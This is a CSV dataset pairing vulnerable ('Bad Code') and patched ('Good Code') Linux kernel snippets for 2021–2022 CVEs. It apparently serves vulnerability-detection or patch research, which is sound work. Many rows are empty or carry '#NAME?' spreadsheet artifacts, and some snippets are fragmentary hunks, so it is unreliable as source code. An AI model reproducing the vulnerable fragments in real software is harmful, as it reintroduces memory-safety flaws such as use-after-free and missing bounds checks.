Year,Type of vulnerability,CVE ID number,Bad Code,Good Code
2022,,CVE-2022-24959,"		ym = memdup_user(data, sizeof(struct yamdrv_ioctl_mcs));
 if (IS_ERR(ym))
 return PTR_ERR(ym);
 if (ym->cmd != SIOCYAMSMCS)
 return -EINVAL;
 if (ym->bitrate > YAM_MAXBITRATE) {
 kfree(ym);
 return -EINVAL;
		}
","		ym = memdup_user(data, sizeof(struct yamdrv_ioctl_mcs));
 if (IS_ERR(ym))
 return PTR_ERR(ym);
 if (ym->cmd != SIOCYAMSMCS || ym->bitrate > YAM_MAXBITRATE) {


 kfree(ym);
 return -EINVAL;
		}
"
2022,,CVE-2022-24958," spin_lock_irq (&dev->lock);
	value = -EINVAL;
 if (dev->buf) {

 kfree(kbuf);
 goto fail;
	}
	dev->buf = kbuf;

"," spin_lock_irq (&dev->lock);
	value = -EINVAL;
 if (dev->buf) {
 spin_unlock_irq(&dev->lock);
 kfree(kbuf);
 return value;
	}
	dev->buf = kbuf;

"
2022,,CVE-2022-24448,"
no_open:
	res = nfs_lookup(dir, dentry, lookup_flags);













 if (switched) {
 d_lookup_done(dentry);
 if (!res)
","
no_open:
	res = nfs_lookup(dir, dentry, lookup_flags);
 if (!res) {
		inode = d_inode(dentry);
 if ((lookup_flags & LOOKUP_DIRECTORY) && inode &&
		    !S_ISDIR(inode->i_mode))
			res = ERR_PTR(-ENOTDIR);
	} else if (!IS_ERR(res)) {
		inode = d_inode(res);
 if ((lookup_flags & LOOKUP_DIRECTORY) && inode &&
		    !S_ISDIR(inode->i_mode)) {
 dput(res);
			res = ERR_PTR(-ENOTDIR);
		}
	}
 if (switched) {
 d_lookup_done(dentry);
 if (!res)
"
2022,,CVE-2022-24122," kfree(new);
		} else {
 hlist_add_head(&new->node, hashent);

 spin_unlock_irq(&ucounts_lock);
 return new;
		}
 if (atomic_dec_and_lock_irqsave(&ucounts->count, &ucounts_lock, flags)) {
 hlist_del_init(&ucounts->node);
 spin_unlock_irqrestore(&ucounts_lock, flags);

 kfree(ucounts);
	}
}
"," kfree(new);
		} else {
 hlist_add_head(&new->node, hashent);
 get_user_ns(new->ns);
 
 spin_unlock_irqrestore(&ucounts_lock, flags);
 put_user_ns(ucounts->ns);
 kfree(ucounts);
	}
}
"
2022,#NAME?,CVE-2022-23222,,
2022,#NAME?,CVE-2022-1055,"spin_unlock_irq(&ucounts_lock);
 return new;
  }
 if (atomic_dec_and_lock_irqsave(&ucounts>count, &ucounts_lock)) {
 hlist_del_init(&ucounts>node);","spin_unlock_irq(&ucounts_lock);
 return new;
  }
 if (atomic_dec_and_lock_irqsave(&ucounts->count, &ucounts_lock, flags)) {
 hlist_del_init(&ucounts->node);"
2022,,CVE-2022-1011,,
2022,Overflow ,CVE-2022-0998,,
2022,DoS +Priv ,CVE-2022-0995,,
2022,,CVE-2022-0854,,
2022,,CVE-2022-0847,,
2022,,CVE-2022-0742,,
2022,,CVE-2022-0646,,
2022,,CVE-2022-0617,,
2022,,CVE-2022-0516,,
2022,Overflow ,CVE-2022-0500,,
2022,#NAME?,CVE-2022-0494,,
2022,Bypass ,CVE-2022-0492,,
2022,,CVE-2022-0487,,
2022,Overflow ,CVE-2022-0435,,
2022,,CVE-2022-0433,,
2022,#NAME?,CVE-2022-0382," msg_set_syn(hdr, 1);
	}



 /* Determine destination */
 if (atype == TIPC_SERVICE_RANGE) {
 return tipc_sendmcast(sock, ua, m, dlen, timeout);
"," msg_set_syn(hdr, 1);
	}

 memset(&skaddr, 0, sizeof(skaddr));

 /* Determine destination */
 if (atype == TIPC_SERVICE_RANGE) {
 return tipc_sendmcast(sock, ua, m, dlen, timeout);
"
2022,,CVE-2022-0330,,
2022,DoS ,CVE-2022-0286,,
2022,,CVE-2022-0264,,
2022,Overflow ,CVE-2022-0185,,
2022,DoS ,CVE-2021-46283,,
2021,#NAME?,CVE-2021-45486,,
2021,#NAME?,CVE-2021-45485,,
2021,,CVE-2021-45480,"				 * should end up here, but if it
				 * does, reset/destroy the connection.
 */

 kmem_cache_free(rds_conn_slab, conn);
				conn = ERR_PTR(-EOPNOTSUPP);
 goto out;
","				 * should end up here, but if it
				 * does, reset/destroy the connection.
 */
 kfree(conn->c_path);
 kmem_cache_free(rds_conn_slab, conn);
				conn = ERR_PTR(-EOPNOTSUPP);
 goto out;
"
2021,,CVE-2021-45469,,
2022,#NAME?,CVE-2021-45402,,
2021,#NAME?,CVE-2021-45095,"
	err = pep_accept_conn(newsk, skb);
 if (err) {

 sock_put(newsk);
		newsk = NULL;
 goto drop;
","
	err = pep_accept_conn(newsk, skb);
 if (err) {
 __sock_put(sk);
 sock_put(newsk);
		newsk = NULL;
 goto drop;
"
2022,,CVE-2021-44879,,
2021,,CVE-2021-44733,,
2021,DoS ,CVE-2021-43976,,
2021,,CVE-2021-43975,,
2021,,CVE-2021-43389,,
2021,,CVE-2021-43267,"	u16 key_gen = msg_key_gen(hdr);
	u16 size = msg_data_sz(hdr);
	u8 *data = msg_data(hdr);

















 spin_lock(&rx->lock);
 if (unlikely(rx->skey || (key_gen == rx->key_gen && rx->key.keys))) {
 pr_err(""%s: key existed <%p>, gen %d vs %d\n"", rx->name,
		       rx->skey, key_gen, rx->key_gen);
 goto exit;
	}

 /* Allocate memory for the key */
	skey = kmalloc(size, GFP_ATOMIC);
 if (unlikely(!skey)) {
 pr_err(""%s: unable to allocate memory for skey\n"", rx->name);
 goto exit;
	}

 /* Copy key from msg data */
	skey->keylen = ntohl(*((__be32 *)(data + TIPC_AEAD_ALG_NAME)));
 memcpy(skey->alg_name, data, TIPC_AEAD_ALG_NAME);
 memcpy(skey->key, data + TIPC_AEAD_ALG_NAME + sizeof(__be32),
	       skey->keylen);

 /* Sanity check */
 if (unlikely(size != tipc_aead_key_size(skey))) {
 kfree(skey);
		skey = NULL;
 goto exit;
	}

	rx->key_gen = key_gen;
	rx->skey_mode = msg_key_mode(hdr);
	rx->skey = skey;
	rx->nokey = 0;
 mb(); /* for nokey flag */

exit:
 spin_unlock(&rx->lock);


 /* Schedule the key attaching on this crypto */
 if (likely(skey && queue_delayed_work(tx->wq, &rx->work, 0)))
 return true;
","	u16 key_gen = msg_key_gen(hdr);
	u16 size = msg_data_sz(hdr);
	u8 *data = msg_data(hdr);
 unsigned int keylen;

 /* Verify whether the size can exist in the packet */
 if (unlikely(size < sizeof(struct tipc_aead_key) + TIPC_AEAD_KEYLEN_MIN)) {
 pr_debug(""%s: message data size is too small\n"", rx->name);
 goto exit;
	}

	keylen = ntohl(*((__be32 *)(data + TIPC_AEAD_ALG_NAME)));

 /* Verify the supplied size values */
 if (unlikely(size != keylen + sizeof(struct tipc_aead_key) ||
		     keylen > TIPC_AEAD_KEY_SIZE_MAX)) {
 pr_debug(""%s: invalid MSG_CRYPTO key size\n"", rx->name);
 goto exit;
	}

 spin_lock(&rx->lock);
 if (unlikely(rx->skey || (key_gen == rx->key_gen && rx->key.keys))) {
 pr_err(""%s: key existed <%p>, gen %d vs %d\n"", rx->name,
		       rx->skey, key_gen, rx->key_gen);
 goto exit_unlock;
	}

 /* Allocate memory for the key */
	skey = kmalloc(size, GFP_ATOMIC);
 if (unlikely(!skey)) {
 pr_err(""%s: unable to allocate memory for skey\n"", rx->name);
 goto exit_unlock;
	}

 /* Copy key from msg data */
	skey->keylen = keylen;
 memcpy(skey->alg_name, data, TIPC_AEAD_ALG_NAME);
 memcpy(skey->key, data + TIPC_AEAD_ALG_NAME + sizeof(__be32),
	       skey->keylen);








	rx->key_gen = key_gen;
	rx->skey_mode = msg_key_mode(hdr);
	rx->skey = skey;
	rx->nokey = 0;
 mb(); /* for nokey flag */

exit_unlock:
 spin_unlock(&rx->lock);

exit:
 /* Schedule the key attaching on this crypto */
 if (likely(skey && queue_delayed_work(tx->wq, &rx->work, 0)))
 return true;
"
2021,Mem. Corr. ,CVE-2021-43057,,
2021,,CVE-2021-43056,,
2021,Overflow ,CVE-2021-42739,,
2021,Overflow ,CVE-2021-42327,,
2021,,CVE-2021-42252,,
2021,,CVE-2021-42008,,
2021,Overflow ,CVE-2021-41864,"
static int prealloc_elems_and_freelist(struct bpf_stack_map *smap)
{
	u32 elem_size = sizeof(struct stack_map_bucket) + smap->map.value_size;

 int err;

	smap->elems = bpf_map_area_alloc(elem_size * smap->map.max_entries,
","
static int prealloc_elems_and_freelist(struct bpf_stack_map *smap)
{
	u64 elem_size = sizeof(struct stack_map_bucket) +
			(u64)smap->map.value_size;
 int err;

	smap->elems = bpf_map_area_alloc(elem_size * smap->map.max_entries,
"
2021,#NAME?,CVE-2021-41073,,
2021,,CVE-2021-40490,,
2021,Exec Code ,CVE-2021-38300,,
2021,,CVE-2021-38209," nf_conntrack_standalone_init_dccp_sysctl(net, table);
 nf_conntrack_standalone_init_gre_sysctl(net, table);

 /* Don't allow unprivileged users to alter certain sysctls */
 if (net->user_ns != &init_user_ns) {
		table[NF_SYSCTL_CT_MAX].mode = 0444;
		table[NF_SYSCTL_CT_EXPECT_MAX].mode = 0444;
		table[NF_SYSCTL_CT_HELPER].mode = 0444;
#ifdef CONFIG_NF_CONNTRACK_EVENTS
		table[NF_SYSCTL_CT_EVENTS].mode = 0444;
#endif
		table[NF_SYSCTL_CT_BUCKETS].mode = 0444;
	} else if (!net_eq(&init_net, net)) {
		table[NF_SYSCTL_CT_BUCKETS].mode = 0444;
	}

"," nf_conntrack_standalone_init_dccp_sysctl(net, table);
 nf_conntrack_standalone_init_gre_sysctl(net, table);

 /* Don't allow non-init_net ns to alter global sysctls */
 if (!net_eq(&init_net, net)) {
		table[NF_SYSCTL_CT_MAX].mode = 0444;
		table[NF_SYSCTL_CT_EXPECT_MAX].mode = 0444;






		table[NF_SYSCTL_CT_BUCKETS].mode = 0444;
	}

"
2021,DoS ,CVE-2021-38208," if (!llcp_sock->service_name) {
 nfc_llcp_local_put(llcp_sock->local);
		llcp_sock->local = NULL;

		ret = -ENOMEM;
 goto put_dev;
	}
		llcp_sock->local = NULL;
 kfree(llcp_sock->service_name);
		llcp_sock->service_name = NULL;

		ret = -EADDRINUSE;
 goto put_dev;
	}
"," if (!llcp_sock->service_name) {
 nfc_llcp_local_put(llcp_sock->local);
		llcp_sock->local = NULL;
		llcp_sock->dev = NULL;
		ret = -ENOMEM;
 goto put_dev;
	}
		llcp_sock->local = NULL;
 kfree(llcp_sock->service_name);
		llcp_sock->service_name = NULL;
		llcp_sock->dev = NULL;
		ret = -EADDRINUSE;
 goto put_dev;
	}
"
2021,DoS Overflow ,CVE-2021-38207," smp_mb();

 /* Space might have just been freed - check again */
 if (temac_check_tx_bd_space(lp, num_frag))
 return NETDEV_TX_BUSY;

 netif_wake_queue(ndev);
"," smp_mb();

 /* Space might have just been freed - check again */
 if (temac_check_tx_bd_space(lp, num_frag + 1))
 return NETDEV_TX_BUSY;

 netif_wake_queue(ndev);
"
2021,DoS ,CVE-2021-38206,"
/**
 * ieee80211_parse_tx_radiotap - Sanity-check and parse the radiotap header
 *				 of injected frames





 * @skb: packet injected by userspace
 * @dev: the &struct device of this 802.11 device
 */
 ieee80211_tx(sdata, sta, skb, false);
}





















bool ieee80211_parse_tx_radiotap(struct sk_buff *skb,
 struct net_device *dev)
{
 struct ieee80211_radiotap_header *rthdr =
		(struct ieee80211_radiotap_header *) skb->data;
 struct ieee80211_tx_info *info = IEEE80211_SKB_CB(skb);
 struct ieee80211_supported_band *sband =
		local->hw.wiphy->bands[info->band];
 int ret = ieee80211_radiotap_iterator_init(&iterator, rthdr, skb->len,
 NULL);
	u16 txflags;
	u8 vht_mcs = 0, vht_nss = 0;
 int i;

 /* check for not even having the fixed radiotap header part */
 if (unlikely(skb->len < sizeof(struct ieee80211_radiotap_header)))
 return false; /* too short to be possibly valid */

 /* is it a header version we can trust to find length from? */
 if (unlikely(rthdr->it_version))
 return false; /* only version 0 is supported */

 /* does the skb contain enough to deliver on the alleged length? */
 if (unlikely(skb->len < ieee80211_get_radiotap_len(skb->data)))
 return false; /* skb too short for claimed rt header extent */

	info->flags |= IEEE80211_TX_INTFL_DONT_ENCRYPT |
		       IEEE80211_TX_CTL_DONTFRAG;
 return false;

 if (rate_found) {



		info->control.flags |= IEEE80211_TX_CTRL_RATE_INJECT;

 for (i = 0; i < IEEE80211_TX_MAX_RATES; i++) {
		} else if (rate_flags & IEEE80211_TX_RC_VHT_MCS) {
 ieee80211_rate_set_vht(info->control.rates, vht_mcs,
					       vht_nss);
		} else {
 for (i = 0; i < sband->n_bitrates; i++) {
 if (rate * 5 != sband->bitrates[i].bitrate)
 continue;
	info->flags = IEEE80211_TX_CTL_REQ_TX_STATUS |
		      IEEE80211_TX_CTL_INJECTED;

 /* Sanity-check and process the injection radiotap header */
 if (!ieee80211_parse_tx_radiotap(skb, dev))
 goto fail;

 /* we now know there is a radiotap header with a length we can use */
 ieee80211_select_queue_80211(sdata, skb, hdr);
 skb_set_queue_mapping(skb, ieee80211_ac_from_tid(skb->priority));









 /* remove the injection radiotap header */
 skb_pull(skb, len_rthdr);

","
/**
 * ieee80211_parse_tx_radiotap - Sanity-check and parse the radiotap header
 *				 of injected frames.
 *
 * To accurately parse and take into account rate and retransmission fields,
 * you must initialize the chandef field in the ieee80211_tx_info structure
 * of the skb before calling this function.
 *
 * @skb: packet injected by userspace
 * @dev: the &struct device of this 802.11 device
 */
 ieee80211_tx(sdata, sta, skb, false);
}

static bool ieee80211_validate_radiotap_len(struct sk_buff *skb)
{
 struct ieee80211_radiotap_header *rthdr =
		(struct ieee80211_radiotap_header *)skb->data;

 /* check for not even having the fixed radiotap header part */
 if (unlikely(skb->len < sizeof(struct ieee80211_radiotap_header)))
 return false; /* too short to be possibly valid */

 /* is it a header version we can trust to find length from? */
 if (unlikely(rthdr->it_version))
 return false; /* only version 0 is supported */

 /* does the skb contain enough to deliver on the alleged length? */
 if (unlikely(skb->len < ieee80211_get_radiotap_len(skb->data)))
 return false; /* skb too short for claimed rt header extent */

 return true;
}

bool ieee80211_parse_tx_radiotap(struct sk_buff *skb,
 struct net_device *dev)
{
 struct ieee80211_radiotap_header *rthdr =
		(struct ieee80211_radiotap_header *) skb->data;
 struct ieee80211_tx_info *info = IEEE80211_SKB_CB(skb);


 int ret = ieee80211_radiotap_iterator_init(&iterator, rthdr, skb->len,
 NULL);
	u16 txflags;
	u8 vht_mcs = 0, vht_nss = 0;
 int i;

 if (!ieee80211_validate_radiotap_len(skb))
 return false;










	info->flags |= IEEE80211_TX_INTFL_DONT_ENCRYPT |
		       IEEE80211_TX_CTL_DONTFRAG;
 return false;

 if (rate_found) {
 struct ieee80211_supported_band *sband =
			local->hw.wiphy->bands[info->band];

		info->control.flags |= IEEE80211_TX_CTRL_RATE_INJECT;

 for (i = 0; i < IEEE80211_TX_MAX_RATES; i++) {
		} else if (rate_flags & IEEE80211_TX_RC_VHT_MCS) {
 ieee80211_rate_set_vht(info->control.rates, vht_mcs,
					       vht_nss);
		} else if (sband) {
 for (i = 0; i < sband->n_bitrates; i++) {
 if (rate * 5 != sband->bitrates[i].bitrate)
 continue;
	info->flags = IEEE80211_TX_CTL_REQ_TX_STATUS |
		      IEEE80211_TX_CTL_INJECTED;

 /* Sanity-check the length of the radiotap header */
 if (!ieee80211_validate_radiotap_len(skb))
 goto fail;

 /* we now know there is a radiotap header with a length we can use */
 ieee80211_select_queue_80211(sdata, skb, hdr);
 skb_set_queue_mapping(skb, ieee80211_ac_from_tid(skb->priority));

 /*
	 * Process the radiotap header. This will now take into account the
	 * selected chandef above to accurately set injection rates and
	 * retransmissions.
 */
 if (!ieee80211_parse_tx_radiotap(skb, dev))
 goto fail_rcu;

 /* remove the injection radiotap header */
 skb_pull(skb, len_rthdr);

"
2021,,CVE-2021-38205,"	}

 dev_info(dev,
 ""Xilinx EmacLite at 0x%08lX mapped to 0x%08lX, irq=%d\n"",
		 (unsigned long __force)ndev->mem_start,
		 (unsigned long __force)lp->base_addr, ndev->irq);
 return 0;

error:
","	}

 dev_info(dev,
 ""Xilinx EmacLite at 0x%08lX mapped to 0x%p, irq=%d\n"",
		 (unsigned long __force)ndev->mem_start, lp->base_addr, ndev->irq);

 return 0;

error:
"
2021,DoS ,CVE-2021-38204," */
 struct urb *curr_urb;
 enum scheduling_pass sched_pass;
 struct usb_device *loaded_dev;	/* dev that's loaded into the chip */
 int loaded_epnum;		/* epnum whose toggles are loaded */
 int urb_done;			/* > 0 -> no errors, < 0: errno */
 size_t curr_len;
	u8 hien;
 * Caller must NOT hold HCD spinlock.
 */
static void
max3421_set_address(struct usb_hcd *hcd, struct usb_device *dev, int epnum,
 int force_toggles)
{
 struct max3421_hcd *max3421_hcd = hcd_to_max3421(hcd);
 int old_epnum, same_ep, rcvtog, sndtog;
 struct usb_device *old_dev;
	u8 hctl;

	old_dev = max3421_hcd->loaded_dev;
	old_epnum = max3421_hcd->loaded_epnum;

	same_ep = (dev == old_dev && epnum == old_epnum);
 if (same_ep && !force_toggles)
 return;

 if (old_dev && !same_ep) {
 /* save the old end-points toggles: */
		u8 hrsl = spi_rd8(hcd, MAX3421_REG_HRSL);

		rcvtog = (hrsl >> MAX3421_HRSL_RCVTOGRD_BIT) & 1;
		sndtog = (hrsl >> MAX3421_HRSL_SNDTOGRD_BIT) & 1;

 /* no locking: HCD (i.e., we) own toggles, don't we? */
 usb_settoggle(old_dev, old_epnum, 0, rcvtog);
 usb_settoggle(old_dev, old_epnum, 1, sndtog);
	}
 /* setup new endpoint's toggle bits: */
	rcvtog = usb_gettoggle(dev, epnum, 0);
	sndtog = usb_gettoggle(dev, epnum, 1);
	hctl = (BIT(rcvtog + MAX3421_HCTL_RCVTOG0_BIT) |
 BIT(sndtog + MAX3421_HCTL_SNDTOG0_BIT));

	max3421_hcd->loaded_epnum = epnum;
 spi_wr8(hcd, MAX3421_REG_HCTL, hctl);

 /*
	 * Note: devnum for one and the same device can change during
	 * address-assignment so it's best to just always load the
	 * address whenever the end-point changed/was forced.
 */
	max3421_hcd->loaded_dev = dev;
 spi_wr8(hcd, MAX3421_REG_PERADDR, dev->devnum);
}

 struct max3421_hcd *max3421_hcd = hcd_to_max3421(hcd);
 struct urb *urb, *curr_urb = NULL;
 struct max3421_ep *max3421_ep;
 int epnum, force_toggles = 0;
 struct usb_host_endpoint *ep;
 struct list_head *pos;
 unsigned long flags;
 usb_settoggle(urb->dev, epnum, 0, 1);
 usb_settoggle(urb->dev, epnum, 1, 1);
			max3421_ep->pkt_state = PKT_STATE_SETUP;
			force_toggles = 1;
		} else
			max3421_ep->pkt_state = PKT_STATE_TRANSFER;
	}

 spin_unlock_irqrestore(&max3421_hcd->lock, flags);

	max3421_ep->last_active = max3421_hcd->frame_number;
 max3421_set_address(hcd, urb->dev, epnum, force_toggles);
 max3421_set_speed(hcd, urb->dev);
 max3421_next_transfer(hcd, 0);
 return 1;
		status = 0;
	urb = max3421_hcd->curr_urb;
 if (urb) {










		max3421_hcd->curr_urb = NULL;
 spin_lock_irqsave(&max3421_hcd->lock, flags);
 usb_hcd_unlink_urb_from_ep(hcd, urb);
"," */
 struct urb *curr_urb;
 enum scheduling_pass sched_pass;


 int urb_done;			/* > 0 -> no errors, < 0: errno */
 size_t curr_len;
	u8 hien;
 * Caller must NOT hold HCD spinlock.
 */
static void
max3421_set_address(struct usb_hcd *hcd, struct usb_device *dev, int epnum)

{
 int rcvtog, sndtog;


	u8 hctl;



















 /* setup new endpoint's toggle bits: */
	rcvtog = usb_gettoggle(dev, epnum, 0);
	sndtog = usb_gettoggle(dev, epnum, 1);
	hctl = (BIT(rcvtog + MAX3421_HCTL_RCVTOG0_BIT) |
 BIT(sndtog + MAX3421_HCTL_SNDTOG0_BIT));


 spi_wr8(hcd, MAX3421_REG_HCTL, hctl);

 /*
	 * Note: devnum for one and the same device can change during
	 * address-assignment so it's best to just always load the
	 * address whenever the end-point changed/was forced.
 */

 spi_wr8(hcd, MAX3421_REG_PERADDR, dev->devnum);
}

 struct max3421_hcd *max3421_hcd = hcd_to_max3421(hcd);
 struct urb *urb, *curr_urb = NULL;
 struct max3421_ep *max3421_ep;
 int epnum;
 struct usb_host_endpoint *ep;
 struct list_head *pos;
 unsigned long flags;
 usb_settoggle(urb->dev, epnum, 0, 1);
 usb_settoggle(urb->dev, epnum, 1, 1);
			max3421_ep->pkt_state = PKT_STATE_SETUP;

		} else
			max3421_ep->pkt_state = PKT_STATE_TRANSFER;
	}

 spin_unlock_irqrestore(&max3421_hcd->lock, flags);

	max3421_ep->last_active = max3421_hcd->frame_number;
 max3421_set_address(hcd, urb->dev, epnum);
 max3421_set_speed(hcd, urb->dev);
 max3421_next_transfer(hcd, 0);
 return 1;
		status = 0;
	urb = max3421_hcd->curr_urb;
 if (urb) {
 /* save the old end-points toggles: */
		u8 hrsl = spi_rd8(hcd, MAX3421_REG_HRSL);
 int rcvtog = (hrsl >> MAX3421_HRSL_RCVTOGRD_BIT) & 1;
 int sndtog = (hrsl >> MAX3421_HRSL_SNDTOGRD_BIT) & 1;
 int epnum = usb_endpoint_num(&urb->ep->desc);

 /* no locking: HCD (i.e., we) own toggles, don't we? */
 usb_settoggle(urb->dev, epnum, 0, rcvtog);
 usb_settoggle(urb->dev, epnum, 1, sndtog);

		max3421_hcd->curr_urb = NULL;
 spin_lock_irqsave(&max3421_hcd->lock, flags);
 usb_hcd_unlink_urb_from_ep(hcd, urb);
"
